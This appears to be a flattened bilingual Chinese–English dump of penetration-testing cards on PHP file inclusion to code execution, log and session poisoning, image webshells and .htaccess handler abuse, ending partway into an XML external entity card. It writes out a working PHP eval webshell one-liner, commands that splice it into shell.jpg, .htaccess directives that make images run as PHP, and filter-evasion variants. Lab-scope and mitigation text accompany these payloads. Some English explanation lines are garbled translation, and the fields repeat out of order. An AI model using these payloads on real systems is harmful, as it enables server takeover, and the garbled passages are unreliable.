name.zh: 服务端文件包含到 RCE

description.zh: 覆盖服务端文件包含的执行边界验证：从日志、会话与环境变量文件包含，到 php://input 与 data:// 包装器执行，再到远程文件包含，用于确认包含点到代码执行的可用路径。
description.en: Covers execution-boundary validation of server-side file inclusion: from log, session, and environment-variable file inclusion through php://input and data:// wrapper execution to remote file inclusion, confirming viable paths from inclusion to code execution.

prerequisites.zh: 确认 服务端文件包含沙箱边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Server-Side Include Sandbox Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 服务端文件包含沙箱边界针对包含参数可加载任意本地或远程资源并按 PHP 执行的场景。覆盖日志、会话、环境变量三类载体包含，php://input 与 data:// 包装器执行，以及远程文件包含五类利用路径。
overview.en: The server-side file-inclusion sandbox boundary targets inclusion parameters that can load arbitrary local or remote resources and execute them as PHP. It covers five exploitation paths: log, session, and environment-variable carriers; php://input and data:// wrapper execution; and remote file inclusion.

vulnerability.zh: 根因是用户输入直接决定 include/require 的目标且未限制 scheme 与根目录，任意可读文件、流包装器或远程 URL 的内容被当作 PHP 源码解释，注入其中的代码随包含执行。
vulnerability.en: The root cause is user input directly determining the include/require target without scheme or root restrictions; content of any readable file, stream wrapper, or remote URL is interpreted as PHP source, and code planted inside executes on inclusion.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在 User-Agent 植入 PHP 并包含访问日志，cmd=whoami 后出现用户名即确认；日志不可用改用第 2 步会话文件或第 3 步 /proc/self/environ；流语义可用时第 4 步经 php://input 或 data:// 直接投递；allow_url_include 开启时第 5 步加载远程 shell.txt。日志路径被拦时改用 URL 编码变体。
exploitation.en: Use payloads in list order: plant PHP in the User-Agent and include the access log per step 1—a username after cmd=whoami confirms it; if logs are unavailable, switch to step 2's session file or step 3's /proc/self/environ; with stream semantics, deliver code directly via step 4's php://input or data://; with allow_url_include on, load remote shell.txt per step 5. Use URL-encoded variants when log paths are blocked.

mitigation.zh: 模板加载使用服务端 ID 映射，禁止用户输入进入 include/require；限制文件根目录与 scheme，关闭 allow_url_include，日志与会话目录不放在可包含路径。修复后重放第 1-5 步载体，确认全部被拒绝且正常模板可用。
mitigation.en: Load templates via server-side ID mapping and keep user input out of include/require; confine file roots and schemes, disable allow_url_include, and keep log and session directories off includable paths. After the fix, replay the step 1-5 carriers and confirm all are rejected while normal templates work.

description.zh: 在 User-Agent 植入 PHP 代码请求目标写入日志，再经包含参数加载日志并传 cmd。命中判据：响应输出当前用户名。
description.en: Plant PHP code in User-Agent, then include the access log with a cmd parameter. Success: the response prints the username.

description.zh: 向会话写入代码后包含 sess_[PHPSESSID] 文件，/proc/self/environ 可用同样思路投毒。命中判据：命令输出返回响应。
description.en: Write code into the session then include sess_[PHPSESSID]; /proc/self/environ works the same way. Success: command output returns.

title.zh: 输入流与内联数据执行
title.en: Execute via input and inline streams

description.zh: 用 php://input 请求体与 data:// 文本或 Base64 内联流直接承载代码执行。命中判据：输出 whoami 命令结果。
description.en: Carry code in the php://input body or data:// inline streams. Success: whoami output is returned.

description.zh: 让 file 参数加载攻击者服务器上的脚本，建立可持续的执行入口。命中判据：HTTP 日志出现脚本请求且命令执行。
description.en: Point file at a script hosted by the attacker for a lasting entry. Success: HTTP logs show the fetch and commands run.

description.zh: 日志路径被拦截时用 URL 编码与双重编码变形后提交包含请求。命中判据：编码后的路径包含成功并执行代码。
description.en: When log paths are blocked, submit URL-encoded and double-encoded variants. Success: the encoded include executes.

analysis.zh: 服务端文件包含沙箱边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Server-Side Include Sandbox Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 只包含沙箱中的静态标记模板，确认规范化路径和允许模板 ID 是否限制实际文件。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

title.en: Include and run via log files

description.zh: 在 User-Agent 中植入 PHP 代码后包含 Apache/Nginx 访问日志，验证被记录进日志的代码在包含时执行。命中判据：携带 cmd=whoami 包含日志后响应输出当前用户名。
description.en: Plant PHP code in the User-Agent, then include the Apache/Nginx access log, verifying logged code executes on inclusion. Success check: including the log with cmd=whoami prints the current username.

title.en: Include and run via session files

description.zh: 包含 sess_[PHPSESSID] 会话文件让其中注入的 PHP 代码执行，验证会话存储路径可控时的包含执行。命中判据：携带 cmd=whoami 包含会话文件后响应输出当前用户名。
description.en: Include the sess_[PHPSESSID] session file so injected PHP code runs, verifying inclusion-based execution via session storage. Success check: including the session file with cmd=whoami prints the current username.

title.zh: 环境变量文件包含执行

description.zh: 把 PHP 代码放入 User-Agent 后包含 /proc/self/environ，验证随请求注入的环境变量在包含时执行。命中判据：包含 /proc/self/environ 后响应输出当前用户名。
description.en: Place PHP code in the User-Agent and include /proc/self/environ, verifying request-injected environment variables execute on inclusion. Success check: including /proc/self/environ prints the current username.

description.zh: 判据: 以 php://input 原始输入流与 data:// 文本/base64 内联流作为包含目标（两者均要求 allow_url_include=On），验证请求体和内联数据可直接按 PHP 执行。命中判据：php://input 请求体或 data:// 内联流被包含执行后输出 whoami 的当前用户名。
description.en: Use the php://input raw stream and data:// text/base64 inline streams as inclusion targets, verifying request bodies and inline data run as PHP. Success check: after the php://input body or data:// inline stream is included and executed, whoami prints the current username.

description.zh: 让 file 参数加载攻击者服务器上的 shell.txt 并执行其中 PHP 代码，验证 allow_url_include 开启时的远程包含。命中判据：攻击者 HTTP 日志出现 shell.txt 请求且响应包含命令输出。
description.en: Have the file parameter load shell.txt from the attacker server and run its PHP code, verifying RFI when allow_url_include is on. Success check: the attacker HTTP log records the shell.txt request and the response contains command output.

title.zh: URL 编码日志路径绕过
title.en: Bypass with a URL-encoded log path

description.zh: 以百分号编码形式传递日志包含路径，验证仅匹配明文 /var/log 路径的过滤规则可被编码绕过。命中判据：编码形式返回与明文路径相同的日志内容。
description.en: Pass the log-inclusion path percent-encoded, verifying filters matching only the plaintext /var/log path can be evaded. Success check: the encoded form returns the same log content as the plaintext path.

description.zh: 以单次 URL 编码、双重 URL 编码与 base64 过滤器读取三种形式呈现同一日志路径，验证仅匹配明文路径或只做一次解码的过滤可被绕过。
description.en: Present the same log path as single URL-encoded, double URL-encoded, and base64-filter forms, verifying filters that match plaintext or decode only once can be bypassed.

syntaxBreakdown.part: 使用URL编码或Base64编码绕过关键字过滤

title.zh: 投毒 User-Agent 并经 LFI 包含访问日志
title.en: Poison the User-Agent and include the access log via LFI

description.zh: 以带 PHP eval 标记的 User-Agent 请求目标使其写入访问日志，再经文件包含参数加载该日志并传入 cmd 参数验证代码执行。命中判据：包含日志并传入 cmd=whoami 后响应输出当前用户名。
description.en: Send a PHP-tagged User-Agent that is written to the access log, then include the log through the file parameter and pass a cmd parameter to verify execution. Success check: including the log with cmd=whoami prints the current username.

title.zh: 对 Nginx 日志路径重复包含验证
title.en: Repeat inclusion against the Nginx log path

description.zh: 对 Nginx 访问日志路径重复同一包含流程，确认不同服务器日志布局下的包含可达性。命中判据：Nginx 日志包含后同样返回命令输出。
description.en: Repeat the same inclusion flow against the Nginx access log path to confirm reachability across server log layouts. Success check: including the Nginx log likewise returns command output.

name.zh: 日志到模板解释边界

description.zh: 覆盖日志投毒到代码执行的链路验证：通过污染 User-Agent 并经 LFI 包含访问日志触发解释执行，并对 Nginx 日志路径重复包含验证稳定性，用于确认日志文件可否成为执行载体。
description.en: Covers chain validation from log poisoning to code execution: poisoning the User-Agent and triggering interpreted execution by including the access log via LFI, with repeated inclusion of Nginx log paths to verify stability, confirming whether log files can serve as execution carriers.

prerequisites.zh: 确认 日志到模板解释边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Log-to-Template Interpretation Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 日志到模板解释边界针对日志投毒升级为代码执行的链路：受控请求头写入日志，日志再经文件包含被当作 PHP 解释。覆盖 User-Agent 投毒后对 Apache 与 Nginx 两类访问日志路径的包含验证。
overview.en: The log-to-template interpretation boundary targets log poisoning escalating to code execution: a controlled request header is written to the log, and the log is later included and interpreted as PHP. It covers User-Agent poisoning followed by inclusion against Apache and Nginx access-log paths.

vulnerability.zh: 根因是日志组件原样记录可控请求头，而包含入口接受日志路径且按 PHP 解释其内容；写入载体与解释器两个本应隔离的边界被包含行为连接成执行链。
vulnerability.en: The root cause is the log component recording controllable headers verbatim while an inclusion endpoint accepts log paths and interprets their content as PHP; the write carrier and interpreter, two boundaries that should stay isolated, are joined into an execution chain by inclusion.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步以带 eval 标记的 User-Agent 请求目标使其写入 Apache 访问日志，再经 ?file=/var/log/apache2/access.log&cmd=whoami 包含该日志，响应出现用户名即确认执行；Apache 路径不可达时按第 2 步对 /var/log/nginx/access.log 重复同一流程确认跨服务器布局的可达性。日志路径被 WAF 拦截时改用编码绕过变体。
exploitation.en: Use payloads in list order: request the target with an eval-carrying User-Agent per step 1 so it lands in the Apache access log, then include it via ?file=/var/log/apache2/access.log&cmd=whoami—a username in the response confirms execution. If the Apache path is unreachable, repeat the flow against /var/log/nginx/access.log per step 2 to confirm reachability across server layouts. Use the encoding-bypass variants if a WAF blocks log paths.

mitigation.zh: 包含入口拒绝日志等任意路径并使用对象 ID 映射，日志组件对请求头做转义或结构化记录，日志目录与解释器隔离。修复后重放第 1、2 步投毒与包含流程，确认日志仅作为文本返回且无代码解释痕迹。
mitigation.en: Inclusion endpoints must reject arbitrary paths like logs and map by object ID; log components should escape or structurally record headers, and log directories stay isolated from interpreters. After the fix, replay the step 1-2 poisoning and inclusion flows and confirm logs return as text with no interpretation traces.

title.zh: 投毒 Apache 日志并包含

description.zh: 以带 eval 代码的 User-Agent 请求目标写入访问日志，再包含日志并传 cmd 参数执行。命中判据：响应输出当前用户名。
description.en: Log an eval-bearing User-Agent, include the Apache log and pass cmd. Success: the response prints the username.

title.zh: 迁移到 Nginx 日志路径

description.zh: 换成 Nginx 访问日志路径重复投毒与包含流程，覆盖不同服务器布局。命中判据：Nginx 路径同样返回命令输出。
description.en: Repeat the poison-include flow against the Nginx log path. Success: the Nginx path also returns command output.

title.en: Slip encoded paths past the WAF

description.zh: 日志路径被规则拦截时，改用全 URL 编码与双重编码变形提交包含。命中判据：变形路径包含成功并执行代码。
description.en: When rules block the path, submit fully and doubly URL-encoded variants. Success: the encoded include executes.

description.zh: 用第 1 步植入的 eval 通道连接 WebShell 管理工具，执行文件浏览与命令操作。命中判据：可稳定执行命令并读写文件。
description.en: Connect a shell manager to the eval channel planted in step 1. Success: stable command execution and file access.

analysis.zh: 日志到模板解释边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Log-to-Template Interpretation Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 把纯文本标记写入实验日志，再确认包含或查看路径是否错误地把日志内容当作代码。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: 图片马与伪装文件执行

description.zh: 覆盖图片马与元数据执行边界：从 Windows copy /b 与 Linux cat 拼接图片马，到 GIF89a 魔术头伪装与 EXIF Comment 注入，再到包含解析与 Apache MIME 映射让 .jpg 按 PHP 执行。
description.en: Covers image-webshell and metadata execution boundaries: from Windows copy /b and Linux cat image-webshell splicing through GIF89a magic-header disguise and EXIF Comment injection to inclusion parsing and Apache MIME mapping that makes .jpg parse as PHP.

prerequisites.zh: 确认 图片元数据执行边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Image-Metadata Execution Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 图片元数据执行边界针对图片文件携带代码绕过上传检查的场景：拼接、魔术头与 EXIF 元数据可让图片成为 PHP 载体。覆盖图片马拼接、GIF89a 与 EXIF 注入、包含解析与 Apache MIME 映射四类利用路径。
overview.en: The image-metadata execution boundary targets images carrying code past upload checks: concatenation, magic headers, and EXIF metadata can turn an image into a PHP carrier. It covers four exploitation paths: image-webshell concatenation, GIF89a and EXIF injection, inclusion/parsing, and Apache MIME mapping.

vulnerability.zh: 根因是上传校验只检查文件头或可预览性而不清洗内容，存储的图片又可被包含入口按 PHP 解释，或被 MIME 映射直接交给 PHP 处理器，图片内的代码因此获得执行机会。
vulnerability.en: The root cause is upload validation that checks only headers or previewability without sanitizing content, combined with stored images being includable as PHP or handed to the PHP handler via MIME mapping—code inside the image thus gets an execution path.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 copy /b 或 cat 把 PHP 代码拼进图片生成 shell.jpg；只查文件头时用第 2 步 GIF89a 或 exiftool 写入 Comment；上传后按第 3 步经包含参数或 phar:// 访问并传 cmd=system('whoami');，返回用户名即执行；扩展名被拦时按第 4 步加 AddType 后直接访问 .jpg。
exploitation.en: Use payloads in list order: append PHP into an image via copy /b or cat in step 1 to produce shell.jpg; when only headers are checked, use step 2's GIF89a or exiftool Comment; after upload, access it through the inclusion parameter or phar:// per step 3 with cmd=whoami—a returned username confirms execution; when extensions are blocked, add AddType per step 4 and request the .jpg directly.

mitigation.zh: 上传图片做完整解码重编码，剥离非常规元数据并按允许列表校验真实类型；上传目录不可执行，包含入口拒绝上传路径，服务器不把图片扩展映射到 PHP。修复后重放第 1-4 步，确认图片马无法落地执行且正常图片可用。
mitigation.en: Fully decode and re-encode uploaded images, strip non-standard metadata, and validate real type against an allowlist; keep upload directories non-executable, reject upload paths at inclusion endpoints, and never map image extensions to PHP. After the fix, replay steps 1-4 and confirm image webshells cannot land or execute while normal images work.

description.zh: Windows 用 copy /b、Linux 用 cat 把 PHP 代码追加到图片尾部生成 shell.jpg。命中判据：文件保留图片头且携带代码。
description.en: Append PHP code to an image via copy /b or cat to build shell.jpg. Success: the file keeps its image header and code.

attackChain.payload:
# Windows
copy test.jpg/b + shell.php/a shell.jpg
# Linux
cat test.jpg shell.php > shell.jpg
echo "<?php @eval($_POST[cmd]);?>" >> test.jpg

description.zh: 加 GIF89a 魔术头伪装，或用 exiftool 把 PHP 代码写入图片 Comment 字段。命中判据：仅查头部或可预览性的检测放行。
description.en: Prepend a GIF89a header or write code into the EXIF Comment field. Success: header-only checks let it through.

title.en: Include and execute the image shell

description.zh: 经文件包含参数与 phar:// 流访问已上传的 shell.jpg 执行内嵌代码。命中判据：传 cmd=system('whoami'); 后返回当前用户名。
description.en: Reach the uploaded shell.jpg through include params or phar://. Success: cmd=whoami returns the username.

title.zh: 配置映射让 jpg 执行

description.zh: Apache 配置 AddType 把 .jpg 映射给 PHP 处理器后直接访问上传目录。命中判据：图片 URL 返回命令输出。
description.en: Map .jpg to PHP via AddType and hit the upload path directly. Success: the image URL returns command output.

attackChain.payload:
# 写入 Web 根目录 .htaccess（Apache 且 AllowOverride 开启时生效）
AddType application/x-httpd-php .jpg
# 之后直接访问图片马
http://{LAB_APP}/upload/shell.jpg

description.zh: 需要最小文件通过头部检查时，直接生成仅含 GIF89a 头的文本文件。命中判据：文件通过魔术头校验。
description.en: When a minimal file suffices, emit a GIF89a-header-only stub. Success: it passes magic-byte checks.

analysis.zh: 图片元数据执行边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Image-Metadata Execution Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 在固定测试图片中写入纯文本元数据，确认上传和处理链是否把元数据交给命令或模板解释器。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

execution.command:
# Windows
copy test.jpg/b + shell.php/a shell.jpg
# Linux
cat test.jpg shell.php > shell.jpg
echo "<?php @eval($_POST[cmd]);?>" >> test.jpg

description.zh: Windows 下用 copy /b、Linux 下用 cat 把 PHP 代码追加到图片生成 shell.jpg，验证仅检查文件头的上传可直接携带 PHP 代码。
description.en: Append PHP code to an image with copy /b (Windows) or cat (Linux) to build shell.jpg, verifying header-only upload checks carry PHP code straight through.

explanation.zh: Windows下将图片和PHP代码二进制合并
explanation.en: Windows Below will Image and PHP Codebinary Combine and
Linux Below Concatenate Image and PHP Code
Describes how the command segment "echo \"<?php ...?>\" >> test.jpg" participates in this validation command.

title.zh: GIF 头伪装与 EXIF 注入

description.zh: 以 GIF89a 魔术头生成伪装 GIF 并用 exiftool 把 PHP 一句话写入 Comment 字段，验证只校验魔术头或可预览性的检查被绕过。
description.en: Forge a GIF starting with the GIF89a magic header and write a PHP one-liner into the Comment field with exiftool, bypassing checks that only inspect magic bytes or previewability.

explanation.zh: GIF文件头魔术字节，用于通过文件头检测
explanation.en: Describes how the command segment "GIF89a" participates in this validation command.

explanation.zh: 一句话木马，@抑制错误信息
explanation.en: Describes how the value segment "<?php @eval($_POST[cmd]);?>" participates in this validation command.

explanation.zh: 将PHP代码写入图片EXIF注释字段，更隐蔽
explanation.en: Describes how the command segment "exiftool -Comment=" participates in this validation command.

title.en: Include and parse the image webshell

description.zh: 判据: 经文件包含参数包含已上传的 shell.jpg 执行内嵌 PHP 代码；phar:// 行仅在 shell.jpg 同时为含 __HALT_COMPILER() 存根与恶意元数据的 phar 多态文件时触发元数据反序列化（构造方式见 PHP 反序列化卡片）。命中判据：包含 shell.jpg 后传入 cmd=system('whoami'); 返回当前用户名。
description.en: Reach the uploaded shell.jpg through an inclusion parameter and the phar:// stream, verifying embedded PHP code or metadata executes on inclusion or parsing. Success check: including shell.jpg with cmd=whoami returns the current username.

title.zh: 让 .jpg 按 PHP 解析

execution.command:
# 写入 Web 根目录 .htaccess（Apache 且 AllowOverride 开启时生效）
AddType application/x-httpd-php .jpg
# 之后直接访问图片马
http://{LAB_APP}/upload/shell.jpg

description.zh: 在 Apache 配置 AddType application/x-httpd-php .jpg 后访问上传目录中的 shell.jpg，验证扩展名黑名单可被 MIME 映射绕过。命中判据：shell.jpg 按 PHP 执行并返回命令输出。
description.en: Map .jpg to the PHP handler with AddType in the Apache config and request the uploaded shell.jpg, verifying extension blacklists are bypassed by MIME mapping. Success check: shell.jpg is executed as PHP and returns command output.

explanation.en: Describes how the command segment "AddType application/x-httpd-php .jpg" participates in this validation command.

explanation.zh: 直接访问图片触发PHP执行，无需文件包含
explanation.en: Describes how the value segment "http://target/upload/shell.jpg" participates in this validation command.

title.zh: 生成 GIF 魔术头夹具

description.zh: 以 printf 写入 GIF89a 魔术头生成最小 GIF 夹具，验证仅比对文件头的类型检查对后续携带任意内容的放行。
description.en: Write the GIF89a magic header with printf to create a minimal GIF fixture, verifying header-only type checks admit files carrying arbitrary trailing content.

explanation.zh: 按格式输出文本写入文件
explanation.en: Print formatted text into a file

explanation.zh: GIF 文件魔术头，用于通过文件头类型检测
explanation.en: GIF magic header used to pass file-type checks
Path of the generated fixture file

name.zh: .htaccess 配置利用

description.zh: 覆盖 .htaccess 目录配置执行边界：从 AddType/AddHandler 映射 PHP 处理，到 auto_prepend_file 自动包含与 ErrorDocument 指向 WebShell 等，确认配置上传后的执行影响。
description.en: Covers execution boundaries of .htaccess directory configuration: from AddType/AddHandler PHP mapping through auto_prepend_file automatic inclusion and ErrorDocument pointing to a webshell, confirming execution impact once such a config file is uploaded.

prerequisites.zh: 确认 Web 服务器目录配置边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Web-Server Directory Configuration Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: Web 服务器目录配置边界针对可向 Apache 上传 .htaccess 的场景：目录级配置可重写处理器映射与 PHP 运行时行为。覆盖 AddType/AddHandler、auto_prepend_file、SetHandler、ErrorDocument 与 include_path 五类配置注入。
overview.en: The web-server directory configuration boundary targets scenarios where .htaccess can be uploaded to Apache: directory-level configuration rewrites handler mappings and PHP runtime behavior. It covers five configuration injections—AddType/AddHandler, auto_prepend_file, SetHandler, ErrorDocument, and include_path.

vulnerability.zh: 根因是上传目录允许 .htaccess 覆盖且未限制可设置指令，攻击者借此把任意扩展名映射到 PHP 处理器、注入 auto_prepend 或劫持 include_path，使目录内文件按代码执行。
vulnerability.en: The root cause is upload directories permitting .htaccess overrides without restricting settable directives; attackers map arbitrary extensions to the PHP handler, inject auto_prepend, or hijack include_path, making files in the directory execute as code.

exploitation.zh: 按 Payload 列表顺序使用：先上传第 1 步含 AddType 的 .htaccess，把 PHP 内容改存 .jpg 验证映射；第 2 步 auto_prepend_file 自动包含 shell.php；扩展名被拦用第 3 步 SetHandler 强制全目录按 PHP 处理；第 4 步把 ErrorDocument 指向 shell.php 触发执行；第 5 步劫持 include_path 扩大包含。被拦截时改用最短配置变体。
exploitation.en: Use payloads in list order: upload step 1's .htaccess with AddType, store PHP content as .jpg, and verify the mapping; step 2's auto_prepend_file auto-includes shell.php; when extensions are blocked, force whole-directory PHP via step 3's SetHandler; step 4 points ErrorDocument at shell.php to trigger execution; step 5 hijacks include_path to widen inclusion. If blocked, use the minimal-config variant.

mitigation.zh: 上传目录禁用 .htaccess 覆盖（AllowOverride None），限制可设置指令；文件存储使用随机对象名并做内容级类型校验。修复后重放第 1-5 步配置上传，确认全部被拒绝且目录内文件均按静态内容返回。
mitigation.en: Disable .htaccess overrides in upload directories (AllowOverride None) and restrict settable directives; store files under random object names with content-level type validation. After the fix, replay the step 1-5 config uploads and confirm all are rejected and directory files are served as static content.

title.zh: 上传映射 PHP 处理的配置

description.zh: 在 .htaccess 中用 AddType 与 AddHandler 把 .jpg、.txt 映射为 PHP 处理。命中判据：上传目录内此类文件被执行。
description.en: Use AddType/AddHandler in .htaccess to map .jpg/.txt to PHP. Success: such files execute in the upload dir.

attackChain.payload:
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg
AddType application/x-httpd-php .txt

description.zh: 用 auto_prepend_file 让目录内 PHP 执行前自动加载后门，并可用 include_path 指向上传目录。命中判据：任意 PHP 页面触发后门。
description.en: Set auto_prepend_file (and steer include_path) so every PHP page loads the backdoor. Success: any PHP page arms it.

description.zh: 以 SetHandler application/x-httpd-php 把目录内全部文件交给 PHP 处理器。命中判据：不依赖扩展名的执行生效。
description.en: Apply SetHandler to hand the whole directory to PHP. Success: files execute regardless of extension.

title.en: Trigger the shell via error pages

description.zh: 把 404 与 500 错误页指向 shell.php，任意错误请求即触发后门。命中判据：访问不存在路径返回后门响应。
description.en: Point ErrorDocument 404/500 at shell.php so any error arms it. Success: a 404 visit returns the shell response.

description.zh: 配置内容被检测时只保留单行 AddType 完成扩展名映射。命中判据：最短配置同样让脚本文件执行生效。
description.en: When config content is inspected, keep a single AddType line. Success: the one-liner still enables execution.

analysis.zh: Web 服务器目录配置边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Web-Server Directory Configuration Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 在隔离虚拟主机中验证上传目录是否接受目录级配置，并仅映射固定文本标记类型。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

title.zh: AddType/AddHandler 映射 PHP 处理
title.en: Map extensions to PHP via AddType/AddHandler

execution.command:
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg
AddType application/x-httpd-php .txt

description.zh: 在 .htaccess 中把 .jpg、.txt 映射为 PHP 处理，验证仅凭扩展名黑名单的防护被 MIME 映射绕过。
description.en: Map .jpg and .txt to PHP handling inside .htaccess, verifying extension-blacklist defenses are bypassed by MIME mapping.

description.zh: 用 php_value auto_prepend_file/auto_append_file 让目录内 PHP 文件执行前/后自动包含 shell.php，验证 .htaccess 可注入 PHP 运行时配置。
description.en: Use php_value auto_prepend_file/auto_append_file so every PHP file in the directory includes shell.php before/after execution, proving .htaccess can inject PHP runtime configuration.

explanation.zh: 每个 PHP 请求前自动包含该文件
explanation.en: Prepend the file to every PHP request

explanation.zh: 每个 PHP 请求后自动包含该文件
explanation.en: Append the file to every PHP request

title.zh: SetHandler 强制 PHP 处理

description.zh: 以 SetHandler application/x-httpd-php 把目录内文件强制交给 PHP 处理器执行，验证不依赖扩展名的处理方式。
description.en: Hand files in the directory to the PHP handler with SetHandler application/x-httpd-php, a technique that does not depend on file extensions.

explanation.zh: 保持原路径的空重写，配合 SetHandler 生效
explanation.en: Identity rewrite keeping the original path, enabling SetHandler

explanation.zh: 强制按 PHP 脚本处理匹配的文件
explanation.en: Force matched files to be handled as PHP

description.zh: 把 404/500 错误页重定向到 shell.php，验证任意错误响应即可触发 WebShell 执行。
description.en: Redirect 404/500 error pages to shell.php, verifying any error response triggers webshell execution.

execution.command:
php_value include_path "/var/www/html/uploads" 
 php_flag safe_mode off 
 php_flag display_errors on

description.zh: 把 include_path 指向上传目录并关闭 safe_mode、打开 display_errors，验证 .htaccess 可放宽 PHP 安全配置配合包含劫持。
description.en: Point include_path at the upload directory, disable safe_mode, and enable display_errors, proving .htaccess can relax PHP security to support include hijacking.

explanation.zh: 把包含搜索路径指向上传目录
explanation.en: Point the include search path at the upload directory

explanation.zh: 回显错误便于确认执行结果
explanation.en: Show errors to confirm execution results

title.zh: 最短配置绕过 .htaccess 检测
title.en: Evade .htaccess inspection with a minimal directive

description.zh: 仅上传一行 AddType 映射，验证针对多行或特定关键字组合的 .htaccess 内容检测可被最短配置绕过。
description.en: Upload a single-line AddType directive, verifying .htaccess content inspection keyed to multi-line or keyword combinations is evaded by the shortest possible config.

explanation.zh: 把 .jpg 映射为 PHP 处理的单行配置
explanation.en: One-line directive mapping .jpg to PHP handling

name.zh: XML 外部实体 OAST 验证

description.zh: 覆盖 XML 外部实体注入的基础验证：从实体探测与本地文件读取，到经 filter 包装器读取 PHP 源码，再到实体发起 SSRF，并附参数实体与 UTF-16 编码绕过变体。
description.en: Covers foundational validation of XML external entity injection: from entity detection and local file reads through PHP source reads via the filter wrapper to SSRF launched from entities, with parameter-entity and UTF-16 encoding bypass variants.

subCategory.zh: 基础实体注入与过滤差异

prerequisites.zh: 确认 XML 外部实体 OAST 验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XML External-Entity OAST Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
